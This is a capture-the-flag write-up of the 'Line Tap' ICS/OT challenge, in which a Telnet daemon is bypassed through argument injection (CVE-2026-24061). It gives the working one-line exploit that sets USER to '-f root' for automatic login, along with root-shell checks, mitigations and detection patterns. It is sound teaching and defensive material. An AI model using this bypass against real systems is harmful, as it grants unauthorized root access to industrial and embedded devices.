# Line Tap — ICS/OT Write-up

| Field | Details |
|---|---|
| Event | Cyber Apocalypse 2026: The Salt Crown |
| Challenge | Line Tap |
| Category | ICS/OT |
| Author | Zain Nadeem |
| Team | CipherForge PK |
| Vulnerability | CVE-2026-24061 — Argument Injection & Authentication Bypass |


## 1. Challenge Overview

`Line Tap` was an ICS/OT challenge involving an exposed maintenance interface on a network-facing host.

The challenge story hinted at an operational environment where old maintenance habits had left behind a dangerous access path. At first, the scenario looked like it might involve an industrial protocol such as Modbus/TCP or a custom PLC service. However, enumeration showed that the exposed service was actually a Telnet daemon.

The spawned target was:

```text
154.57.164.75:31660
```

The goal was to identify the exposed service, understand the authentication weakness, exploit the Telnet login behavior, obtain shell access, and retrieve the challenge proof from the system.

This challenge was categorized as ICS/OT because it simulated a legacy maintenance interface exposed on an industrial-style target.


## 2. Initial Enumeration

I started by scanning the spawned target service:

```bash
HOST=154.57.164.75
PORT=31660

nmap -Pn -sV -p $PORT $HOST
```

Nmap identified the service as Telnet:

```text
PORT      STATE SERVICE REASON         VERSION
31660/tcp open  telnet  syn-ack ttl 52 Openwall GNU/*/Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This result was important because it changed the direction of the challenge.

Instead of continuing with only ICS protocol assumptions such as Modbus/TCP, I treated the service as a legacy Telnet-based maintenance interface.

Additional checks:

```bash
nc -vz 154.57.164.75 31660
nc 154.57.164.75 31660
telnet 154.57.164.75 31660
```

The service accepted Telnet-style interaction, which suggested that the weakness could be related to legacy remote-login behavior.


## 3. Vulnerability Identification

The exposed Telnet service matched a known authentication-bypass class:

```text
CVE-2026-24061: Argument Injection & Authentication Bypass
```

The vulnerable behavior is related to GNU Inetutils `telnetd` and unsafe handling of the `USER` environment variable.

The issue occurs when a client-controlled login value is passed into the login process without safely separating user input from command-line options.

The dangerous value is:

```text
-f root
```

If the login chain interprets this as an option instead of a username, it may force login as `root` without requiring normal authentication.

Conceptually, the vulnerable flow looks like this:

```text
telnet client sends USER value
        ↓
telnetd receives user-controlled value
        ↓
telnetd passes it into login handling
        ↓
value begins with "-"
        ↓
login interprets it as an option
        ↓
authentication is bypassed
```

In this challenge, that behavior allowed direct privileged access.


## 4. Root Cause

The root cause was argument injection through unsafe login value handling.

A vulnerable implementation behaves conceptually like:

```text
login <user-controlled-value>
```

If the supplied value is:

```text
-f root
```

then the login utility may treat it as an option rather than as a username.

A safer implementation should either reject login names beginning with `-`, or force the end of command-line options before passing the username:

```text
login -- <username>
```

This prevents user-controlled data from being interpreted as command-line flags.

The issue is especially dangerous in Telnet-style services because Telnet supports automatic login negotiation and environment/user values that may be sent by the client.


## 5. Exploitation

The exploitation step used the local Telnet client’s automatic login behavior.

The working command was:

```bash
USER='-f root' telnet -a 154.57.164.75 31660
```

Explanation:

```text
USER='-f root'  -> sets the login value sent by the Telnet client
telnet -a       -> enables automatic login
31660/tcp       -> exposed Telnet service
```

Instead of sending a normal username, the client sent:

```text
-f root
```

The vulnerable Telnet/login chain interpreted this as an argument to the login process.

As a result, the service bypassed normal authentication and provided privileged access.


## 6. Access Verification

After connecting, I verified the obtained shell access with basic commands:

```bash
id
whoami
pwd
ls -la
```

Expected result:

```text
uid=0(root)
root
```

This confirmed that the authentication bypass worked and that the session had root-level privileges.


## 7. Retrieving the Challenge Proof

After obtaining shell access, I searched for the challenge proof file.

Useful commands:

```bash
ls -la /
ls -la /root
find / -name '*flag*' 2>/dev/null
```

The proof file was located at:

```bash
/flag.txt
```

It could be read with:

```bash
cat /flag.txt
```

The final flag is intentionally not included in this public write-up.

```text
Final Flag: Redacted / Not Included
```


## 8. Why This Fits ICS/OT

Although the vulnerability was in a Telnet daemon rather than an industrial protocol itself, this challenge still fits the ICS/OT category.

Many real-world OT and embedded environments still contain legacy management interfaces such as:

```text
Telnet
serial consoles
vendor maintenance shells
old Linux-based device services
insecure remote administration ports
```

These services are often dangerous because they may be:

```text
exposed internally for maintenance
poorly monitored
running with high privileges
using outdated software
trusted because they are “inside” the OT network
```

In this case, the Telnet service acted as a legacy maintenance path into the system.

The vulnerability allowed authentication bypass and root-level access, which would be critical in a real operational environment.


## 9. Key Observations

The important observations were:

```text
1. The target exposed a raw TCP service on port 31660.
2. Nmap identified the service as Telnet.
3. The version banner indicated Openwall GNU/*/Linux telnetd.
4. The challenge was not solved through Modbus or another PLC protocol.
5. The exposed Telnet service matched CVE-2026-24061 behavior.
6. The USER environment variable could control the automatic login value.
7. Supplying `-f root` triggered argument injection.
8. The service returned a privileged shell.
9. The challenge proof was readable from `/flag.txt`.
```


## 10. Solve Chain

The full solve chain was:

```text
Scan target port
        ↓
Identify Telnet service
        ↓
Recognize GNU/Linux telnetd behavior
        ↓
Map behavior to CVE-2026-24061
        ↓
Set USER environment variable to `-f root`
        ↓
Use Telnet automatic login with `-a`
        ↓
Trigger argument injection
        ↓
Bypass authentication
        ↓
Obtain root shell
        ↓
Read `/flag.txt`
```

Exploit command:

```bash
USER='-f root' telnet -a 154.57.164.75 31660
```

Proof retrieval:

```bash
cat /flag.txt
```

Final flag:

```text
Redacted / Not Included
```


## 11. Security Impact

The impact of this issue is critical.

A remote attacker who can reach the vulnerable Telnet service can bypass authentication and gain root-level access.

In an ICS/OT environment, this could lead to:

```text
unauthorized device administration
configuration tampering
process disruption
data theft
persistence on embedded devices
pivoting deeper into the OT network
loss of operational visibility
loss of control over field systems
```

Because Telnet is often used for maintenance access, compromise of this service can directly expose sensitive operational systems.


## 12. Defensive Recommendations

Recommended mitigations:

```text
1. Disable Telnet wherever possible.
2. Replace Telnet with SSH using strong authentication.
3. Do not expose maintenance interfaces to untrusted networks.
4. Restrict access with VPNs, jump hosts, and network segmentation.
5. Patch GNU Inetutils telnetd to a fixed version.
6. Reject usernames or login values beginning with `-`.
7. Use `--` before user-controlled values when invoking login-like programs.
8. Avoid passing unsanitized user input into command-line tools.
9. Run management services with least privilege.
10. Monitor for unusual Telnet logins and root shell activity.
```

A safer login invocation pattern is:

```text
login -- <username>
```

instead of:

```text
login <username>
```


## 13. Detection Ideas

Defenders can look for indicators such as:

```text
Telnet connections to non-standard ports
Telnet automatic login attempts
USER values containing `-f root`
unexpected root login sessions
interactive shells spawned by telnetd
access to `/flag.txt` or sensitive files after Telnet login
```

Example suspicious pattern:

```text
USER=-f root
```

Network and host logs should be reviewed for Telnet sessions where the username begins with a dash.


## 14. Lessons Learned

`Line Tap` was a good reminder that ICS/OT challenges are not always about industrial protocols like Modbus, DNP3, IEC-104, or proprietary PLC traffic.

Sometimes the most dangerous weakness is a forgotten maintenance interface.

The key lesson was:

```text
When an OT target exposes a legacy remote-login service, test the management interface carefully before assuming the path is a PLC protocol.
```

Another important lesson was about argument injection:

```text
User-controlled values that begin with `-` can become dangerous when passed to command-line tools.
```

This type of issue is simple but powerful because it can turn a login value into an option that changes program behavior.


## 15. Final Summary

`Line Tap` was an ICS/OT challenge involving an exposed Telnet maintenance interface.

Enumeration showed:

```text
31660/tcp open telnet Openwall GNU/*/Linux telnetd
```

The service was vulnerable to an argument-injection authentication bypass matching CVE-2026-24061.

By controlling the Telnet auto-login value through the `USER` environment variable and using:

```bash
USER='-f root' telnet -a 154.57.164.75 31660
```

I bypassed authentication and obtained privileged shell access.

The challenge proof was then retrieved from:

```bash
cat /flag.txt
```

Final flag:

```text
The final flag is not included in this write-up.
